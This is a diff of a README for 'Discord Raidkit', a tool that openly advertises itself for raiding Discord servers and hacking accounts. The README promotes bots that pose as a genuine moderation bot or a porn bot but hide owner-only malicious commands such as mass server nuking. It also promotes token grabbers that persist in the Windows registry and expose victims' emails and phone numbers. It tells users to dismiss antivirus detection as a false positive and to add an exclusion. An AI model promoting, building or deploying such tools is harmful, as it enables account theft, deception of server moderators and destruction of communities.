@@ -1,41 +1,55 @@
 # Discord Raidkit
 
+⚠ Windows Defender now reports this program as malware - this is a false positive and can be ![excluded](https://support.microsoft.com/en-us/windows/add-an-exclusion-to-windows-security-811816c0-4dfd-af4a-47e4-c301afe13b26#:~:text=Go%20to%20Start%20%3E%20Settings%20%3E%20Update,%2C%20file%20types%2C%20or%20process.)! ⚠
+
 ![Discord Raidkit v2.3.4 image](https://user-images.githubusercontent.com/98130822/222992322-ececffd1-ae6d-4d1e-bbc5-a4d6dead6f48.png)
+
+## Contents
+
+- ![Introduction](#Introduction)
+- ![Installation](#Installation)
+- ![Commands](#Commands)
+- ![Repo](#Repo)
 
 ---
 
-### What is Discord Raidkit?
+### Introduction
 
-Discord Raidkit is a compilation of useful tools to help you raid discord servers and hack discord accounts. What sets Discord Raidkit apart from other similar projects is its emphasis on social engineering — Discord Raidkit is *the* raidkit for anyone looking to convince servers to add bots. 
+#### What is Discord Raidkit?
 
-### Why choose Discord Raidkit over similar programs?
-There are several reasons to choose Discord raidkit over similar programs:
-- Unlike many raiders, Discord Raidkit is free and open-source.
-- Unlike many raiders, Discord Raidkit comes with fully functional, non-malicious commands to further aid in social engineering.
-- Unlike many raiders, Discord Raidkit is professionally written for performance, running far faster than some other programs.
+Discord Raidkit is a free and open-source compilation of tools designed for raiding Discord servers and hacking accounts. It focuses on social engineering and includes non-malicious commands to assist with that.
 
-### What tools are included in Discord Raidkit?
+#### Why choose Discord Raidkit?
 
-- **Anubis** is a moderation bot that comes with genuine server management commands and some utility commands, like bans and timeouts. Keep note of this when attempting to convince a moderation team to add the bot. Hidden malicious commands can be accessed by the bot owner only (typically you) once added.
+Discord Raidkit stands out from similar programs because it is free, open-source, and has professionally written code that runs faster than competitors. It is kept up to date and evolves with Discord, using new features such as slash commands.
 
-- **Qetesh** is a fully functional porn bot with over 10,000 images, channel management, and 25 commands. Qetesh is an easy bot to add to most NSFW servers, as many will blindly add whatever porn bot is requested by their members. Like Anubis, hidden malicious commands can be accessed by the bot owner only once added.
+#### Tools included in Discord Raidkit
 
-- **Osiris** is a user authentication token handler. With Osiris, you can generate token grabbers that have been adapted to embed themselves within Windows registries, look up information about a token such as the email address and phone number attatched to it, fill up the users server count and mess with their settings, as well as log into an account with just one selenium script. **To use Osiris, you must include [this browser folder](https://drive.proton.me/urls/7898MKJM2W#LIrqn3KDFmsi) - put it in the same directory as `main.py`**
+Discord Raidkit includes:
+
+- **Anubis**: A moderation bot with genuine server management commands and hidden malicious commands accessible only by the bot owner.
+
+- **Qetesh**: A fully functional porn bot with over 10,000 images and hidden malicious commands accessible only by the bot owner. Images are stored as CDN links in a generated database to drastically improve command-to-render speed.
+
+- **Osiris**: A user authentication token handler that can generate token grabbers to embed within Windows registries, father information about a token, and log into an account with just one selenium script. **To use Osiris, you must include [this browser folder](https://drive.proton.me/urls/7898MKJM2W#LIrqn3KDFmsi) - put it in the same directory as `main.py`!**
 
 ---
 
 ### Installation
-- Visit the [releases page](https://github.com/the-cult-of-integral/discord-raidkit/releases) and download the latest version.
+
+To install Discord Raidkit:
+
+- Download the latest version from the [releases page](https://github.com/the-cult-of-integral/discord-raidkit/releases/latest).
 
 - Run the `install_requirements` script for your operating system.
 
-- Run `main.py` to start the program.
+- Start the program by running `main.py`.
 
-*/!\ This project requires Python 3.10.0+ — install at [python.org](https://www.python.org/downloads/) — /!\ When installing Python, check "Add to PATH"!*
+- Ensure that you have Python 3.10.0+ installed — be sure to check "Add to PATH" during installation!
 
 ---
 
-### Anubis / Qetesh — Hidden Commands Summary
+### Hidden Commands Summary
 
 |Command|Aliases|Parameters|Brief Description|
 |-|-|-|-|
@@ -50,24 +64,21 @@ There are several reasons to choose Discord raidkit over similar programs:
 | mass_nuke | massnuke, nuke_all, nukeall | --- | perform the nuke command on every server the bot is in, one by one |
 | leave | --- | --- | leave a server |
 | mass_leave | massleave, leave_all, leaveall | --- | leave every server |
----
-
-### Known Issues (v2.3.4)
-- None.
 
 ---
 
-### Upcoming Releases
+### Repo
 
-##### v.2.4.0 — Not yet planned. . .
+#### Known Issues
 
----
+There are no known issues in Discord Raidkit v2.3.4.
 
-### Repository Milestones
-- 10 stars. ✅
-- 50 stars. ✅
-- 100 stars. ✅
-- 250 stars. ✅
+#### Repository Milestones
+
+- 10 stars. ✔
+- 50 stars. ✔
+- 100 stars. ✔
+- 250 stars. ✔
 - 500 stars. ❌
 - 1000 stars. ❌
 
